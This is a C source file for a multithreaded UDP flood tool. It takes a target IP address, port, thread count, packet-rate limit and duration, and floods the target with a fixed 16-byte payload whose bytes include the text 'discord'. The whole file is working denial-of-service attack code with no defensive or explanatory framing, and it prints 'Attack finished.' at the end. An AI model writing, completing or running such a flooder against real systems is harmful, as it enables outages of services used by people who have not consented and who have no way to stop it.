#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_PACKET_SIZE 4096

static unsigned int port;
static unsigned int jebem = 16;
static char* packetstrx = "\x13\x37\xca\xfe\x01\x00\x00\x00\x00\x64\x69\x73\x63\x6f\x72\x64";
static int pps_limit;
volatile unsigned int pps_counter = 0;
pthread_mutex_t pps_mutex = PTHREAD_MUTEX_INITIALIZER;

void* flood(void* target_ip_ptr) {
    char* target_ip = (char*)target_ip_ptr;
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s == -1) {
        perror("Socket error");
        exit(1);
    }

    struct sockaddr_in sin;
    char packet[MAX_PACKET_SIZE];

    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    while (1) {
        memset(packet, 0, MAX_PACKET_SIZE);
        memcpy(packet, packetstrx, jebem);

        if (pps_limit != -1) {
            if (pps_counter >= pps_limit) {
                usleep(1);
                continue;
            }
            pps_counter++;
        }

        sendto(s, packet, jebem, 0, (struct sockaddr*)&sin, sizeof(sin));
    }

    close(s);
    return NULL;
}

void* pps_reset_thread(void* arg) {
    while (1) {
        sleep(1);
        if (pps_limit != -1) {
            pps_counter = 0;
        }
    }
    return NULL;
}

int main(int argc, char* argv[]) {
    if (argc < 6) {
        printf("Usage: %s <target_ip> <port> <threads> <pps_limit (-1 = unlimited)> <duration>\n", argv[0]);
        return -1;
    }

    srand(time(NULL));
    char* target_ip = argv[1];
    port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    pps_limit = atoi(argv[4]);
    int duration = atoi(argv[5]);

    pthread_t thread[threads];
    pthread_t limiter_thread;
    pthread_create(&limiter_thread, NULL, &pps_reset_thread, NULL);

    for (int i = 0; i < threads; i++) {
        pthread_create(&thread[i], NULL, &flood, target_ip);
    }

    sleep(duration);
    printf("Attack finished.\n");
    return 0;
}
